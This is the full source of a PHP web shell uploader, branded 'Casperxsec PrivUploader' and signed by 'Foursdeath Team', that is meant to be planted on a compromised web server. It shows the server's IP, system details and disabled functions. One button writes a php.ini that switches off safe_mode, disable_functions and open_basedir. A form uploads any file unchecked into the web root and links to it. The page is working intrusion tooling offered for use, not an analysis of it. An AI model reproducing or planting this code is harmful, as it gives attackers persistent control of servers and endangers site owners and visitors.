<html>
<head>
<script>alert('<<Welcome To PrivRoot Home Uploader>>')</script>
<title>.::Casperxsec PrivUploader!::.</title>
<meta name="keywords" content=".::Casperxsec PrivUploader!::.">
<meta name="description" content="●~PrivHome Root Uploader2k24~●">
<meta name="rating" content="General">
<meta name="revisit-after" content="1 days">
<meta name="classification" content="●~Author by Casperxsec●~">
<meta name="robots schedule" content="auto">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	height: 24px;
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: white; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
</style>
</head>
<center><br>
<pre>
▂▃▅▇█▓▒░۩۞۩ஜ۩ PrivHome Root Uploader ۩ஜ۩۞۩░▒▓█▇▅▃▂
																	
☠️   Come on try me :)   ☠️  

▬▬▬▬▬▬▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬▬▬▬▬▬▬

</pre>
<a href="Casperxsec"><img src='https://res.cloudinary.com/dvztple2b/image/upload/v1727338039/casperinthehouse_eyofxg.png' title="Foursdeath Team" width='180' height='180' align='center'></a>
<br>
<body bgcolor="black">
<?php
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); 
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=red>NONE</font>";
echo "<b><font color='white'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<b><font color='white'><br>".php_uname()."</b></font><br>";
echo "<b><font color='white'>Disable Functions : $show_ds</b></font><br><br>";
echo "<form method='post'>
<input type='submit' name='funct' value='Bypass Disabled Functions'>
</form>";
if($_POST['funct']) {
$file = 'php.ini';
file_put_contents($file,'safe_mode = OFF
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF');
echo "<font color='#2EFEF7'>Bypased!!</font>";
}

echo "<font color='white'><form method='post' enctype='multipart/form-data'>
	  <input type='file' name='file'>
	  <input type='submit' name='upload' value='Upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Upload Success , File Location at=> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Upload Failed";
		}
	} else {
		if(@copy($_FILES['file']['tmp_name'], $files)) {
			echo "Success <b>$files</b> at folder";
		} else {
			echo "Upload Failed";
		}
	}
}

?>
<font face='Arial' color='white' size='4px'><br>━═★ Powered by Casperxsec ☆═━
</html>
